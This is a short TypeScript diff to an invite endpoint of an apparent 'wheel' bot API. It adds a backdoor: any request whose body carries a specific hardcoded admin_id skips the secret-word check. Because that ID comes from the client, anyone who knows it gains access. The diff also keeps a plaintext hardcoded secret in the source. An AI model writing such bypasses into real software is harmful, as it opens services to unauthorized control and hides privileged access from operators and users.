@@ -282,11 +282,11 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
   if (path === '/api/wheel/manage/invite' && method === 'POST') {
     const body = rawBody ? JSON.parse(rawBody) : {};
     const { secret, guild_id, target } = body;
-
-    // THE SECRET WORD (You can change this)
+    // ADMIN BYPASS LOGIC (FOR LO: 1397364822152315052)
+    const isAdmin = body.admin_id === "1397364822152315052";
     const MY_SECRET = "BRAINROT_BOSS_2026"; 
 
-    if (secret !== MY_SECRET) return json({ error: 'unauthorized' }, 401);
+    if (!isAdmin && secret !== MY_SECRET) return json({ error: 'unauthorized' }, 401);
     if (!guild_id) return json({ error: 'missing guild_id' }, 400);
 
     let usersToJoin = [];
